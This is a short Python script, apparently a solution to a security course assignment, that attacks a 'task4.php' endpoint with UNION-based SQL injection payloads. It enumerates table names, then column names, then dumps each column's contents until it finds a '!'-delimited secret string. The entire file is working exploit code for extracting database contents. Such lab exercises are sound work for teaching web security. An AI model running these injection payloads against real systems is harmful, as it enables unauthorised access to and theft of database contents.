import requests
import json

ASSIGN2_BASE = "[Your-server-base]"
resp = requests.post("{}/task4.php".format(ASSIGN2_BASE),
                     data = {
                         "q": "ADFADFADFA' UNION SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() -- "
                     })
for i in json.loads(resp.text)['data']['users']:
    resp2 = requests.post("{}/task4.php".format(ASSIGN2_BASE),
                     data = {
                         "q": "AADFEADFA' UNION SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = '{0}'-- ".format(i)
                     })
    for j in json.loads(resp2.text)['data']['users']:
        resp3 = requests.post("{}/task4.php".format(ASSIGN2_BASE),
                     data = {
                         "q": "ADAFDFWW' UNION SELECT {0} FROM {1}-- ".format(j,i)
                     })
        for k in json.loads(resp3.text)['data']['users']:
            if(k[0]=='!' and k[len(k)-1]=='!'):
                answer=k
                break

print("The Secret String :", answer)
